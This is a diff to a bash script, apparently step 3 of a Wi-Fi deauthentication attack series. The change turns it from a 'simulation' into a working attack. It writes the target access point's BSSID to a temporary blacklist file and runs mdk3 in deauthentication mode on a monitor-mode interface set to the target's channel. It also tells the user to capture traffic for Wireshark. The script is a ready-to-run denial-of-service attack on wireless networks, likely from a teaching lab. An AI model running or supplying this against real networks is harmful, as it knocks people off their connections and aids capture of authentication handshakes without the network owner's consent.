@@ -1,7 +1,9 @@
 #!/bin/bash
-# Perform a simulation of a Wi-Fi deauthentication attack using aircrack-ng
+# Deauthentication Attack Step 3: Perform a Wi-Fi deauthentication attack on a WAP using mdk3
 # Dependencies:
 # - https://salsa.debian.org/pkg-security-team/mdk3
+# - https://git.kernel.org/pub/scm/linux/kernel/git/jberg/iw.git
+# - https://github.com/BurntSushi/ripgrep
 
 BOLD="\e[1m"
 RED="\e[0;31m"
@@ -16,7 +18,7 @@ echo -e "${YELLOW}=== Perform Deauthentication Attack Step 3: Attack ===${NORMAL
 # Three terminal windows are required for the attack, notify the user
 echo -e "Three terminal windows are ${BOLD}required${NORMAL} to perform the deauthentication attack:"
 echo -e "1. Display the WAP that will be attacked"
-echo -e "2. Capture data from the WAP into a file"
+echo -e "2. Capture data traffic from the WAP into a file"
 echo -e "${GREEN}${BOLD}3. Perform the deauthentication attack${NORMAL}"
 echo -e
 
@@ -49,11 +51,19 @@ echo -e "Setting channel of ${BOLD}${INTERFACE_NAME_MONITOR}${NORMAL} to ${BOLD}
 sudo iw dev "${INTERFACE_NAME_MONITOR}" set channel "${CHANNEL}"
 echo -e
 
+# Create a temporary file containing BSSID to run the deauthentication attack on (blacklist mode in mdk3)
+TMP_BLACKLIST_FILE=$(mktemp -t blacklist.XXXXXXXX)
+trap 'rm -f "$TMP_BLACKLIST_FILE"' EXIT # Auto-delete file on script exit
+echo "${BSSID}" >"${TMP_BLACKLIST_FILE}"
+echo -e "Creating temporary file ${BOLD}${TMP_BLACKLIST_FILE}${NORMAL} containing BSSID ${BOLD}${BSSID}${NORMAL}"
+echo -e
+
 # Perform the deauthentication attack by deauthenticating clients from a WAP
 echo -e "Performing deauthentication attack on WAP ${BOLD}${BSSID}${NORMAL} using interface ${BOLD}${INTERFACE_NAME_MONITOR}${NORMAL}"
+echo -e "Press ${BOLD}Ctrl+C${NORMAL} to stop the attack"
 read -n 1 -s -r -p "Press any key to continue..."
 echo -e
-sudo mdk3 "${INTERFACE_NAME_MONITOR}" d -b "test"
+sudo mdk3 "${INTERFACE_NAME_MONITOR}" d -b "${TMP_BLACKLIST_FILE}"
 echo -e
 
 echo -e "${GREEN}Deauthentication attack executed. View data with ${BOLD}Wireshark${NORMAL}.${NORMAL}"
